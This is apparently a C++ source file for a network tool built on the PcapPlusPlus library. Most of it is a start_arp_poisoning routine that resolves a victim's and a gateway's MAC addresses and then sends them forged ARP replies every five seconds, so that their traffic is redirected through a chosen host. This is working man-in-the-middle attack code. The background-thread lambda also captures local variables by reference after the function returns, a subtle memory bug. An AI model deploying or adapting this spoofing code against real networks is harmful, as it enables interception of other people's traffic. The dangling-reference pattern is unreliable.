//
// Created by dev on 6/5/25.
//

#include "../include/net_core.h"

Net_core::Net_core() {

}

pcpp::MacAddress Net_core::arp(pcpp::IPv4Address ip) {
    double arpResponseTimeMS;
    double arpTimeOut=2;
    return pcpp::NetworkUtils::getInstance().getMacAddress(ip, dev_, arpResponseTimeMS,
                                                           dev_->getMacAddress(), dev_->getIPv4Address(), arpTimeOut);
}

int Net_core::discover_interface() {
    std::vector<pcpp::PcapLiveDevice*> deviceList=pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDevicesList();

    for (auto i: deviceList) {
        if (i->getIPv4Address() != pcpp::IPv4Address("0.0.0.0") &&
            i->getIPv4Address() != pcpp::IPv4Address("127.0.0.1")) {
            dev_=i;
            return 1;
        }
    }

    return 0;
}

pcpp::IPv4Address Net_core::interface_ip() {
    if(dev_== nullptr){
        discover_interface();
    }
    return dev_->getIPv4Address();
}

void Net_core::start_arp_poisoning(pcpp::IPv4Address iface_ip, pcpp::IPv4Address vic_src_ip, pcpp::IPv4Address vic_dst_ip,
                              pcpp::IPv4Address forward_to_ip) {
    logger_.log("starting arp poisoning . . .\n");
    dev_=pcpp::PcapLiveDeviceList::getInstance().getDeviceByIp(iface_ip);
    if(dev_ == nullptr){
        logger_.log("couldnt find device\n");
        return;
    }
    if(!dev_->open()){
        logger_.log("couldn't open device");
        return;
    }


    pcpp::MacAddress iface_mac=dev_->getMacAddress();
    pcpp::MacAddress vic_src_mac= arp(vic_src_ip);
    if(vic_src_mac==pcpp::MacAddress::Zero){
        logger_.log("didnt recieve arp reply from "+vic_src_ip.toString()+"\n");
        return;
    }
    pcpp::MacAddress vic_dst_mac= arp(vic_dst_ip);
    if(vic_dst_mac==pcpp::MacAddress::Zero){
        logger_.log("didnt recieve arp reply from "+vic_dst_ip.toString()+"\n");
        return;
    }
    pcpp::MacAddress forward_to;
    if (forward_to_ip==iface_ip){
        forward_to=iface_mac;
    }
    else{
        forward_to= arp(forward_to_ip);
        if(forward_to==pcpp::MacAddress::Zero){
            logger_.log("didnt recieve arp reply from "+forward_to_ip.toString()+"\n");
            return;
        }
    }

    add_live_thread([&](std::shared_ptr<bool> alive){

        pcpp::Packet gwArpReply(500);
        pcpp::EthLayer gwEthLayer(iface_mac, vic_dst_mac, static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
        pcpp::ArpLayer gwArpLayer(pcpp::ArpReply(forward_to, vic_src_ip, vic_dst_mac, vic_dst_ip));
        gwArpReply.addLayer(&gwEthLayer);
        gwArpReply.addLayer(&gwArpLayer);
        gwArpReply.computeCalculateFields();

        // Create ARP reply for the victim
        pcpp::Packet victimArpReply(500);
        pcpp::EthLayer victimEthLayer(iface_mac, vic_src_mac, static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
        pcpp::ArpLayer victimArpLayer(pcpp::ArpReply(forward_to, vic_dst_ip, vic_src_mac, vic_src_ip));
        victimArpReply.addLayer(&victimEthLayer);
        victimArpReply.addLayer(&victimArpLayer);
        victimArpReply.computeCalculateFields();

        logger_.log("Sending ARP replies to victim and to gateway every 5 seconds...\n");
        while (*alive)
        {
            dev_->sendPacket(&gwArpReply);
            dev_->sendPacket(&victimArpReply);

            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    });

}

void Net_core::add_logger_method(std::function<void(const std::string &)> method) {
    logger_.add_log_method(method);
}

void Net_core::add_live_thread(std::function<void(std::shared_ptr<bool>)> func) {
    live_thread_alive[last_added_thread_id]=std::make_shared<bool>(true);
    live_threads[last_added_thread_id]=std::make_shared<std::thread>(func,live_thread_alive[last_added_thread_id]);
    live_threads[last_added_thread_id]->detach();

    last_added_thread_id++;

}

void Net_core::kill_thread(int id) {
    *live_thread_alive[id]= false;
    live_threads.erase(id);
    logger_.log("killed thread "+std::to_string(id)+" .\n");
}

std::vector<int> Net_core::get_live_threads() {
    std::vector<int> out;
    for(auto i:live_threads){
        out.push_back(i.first);
    }
    return out;
}
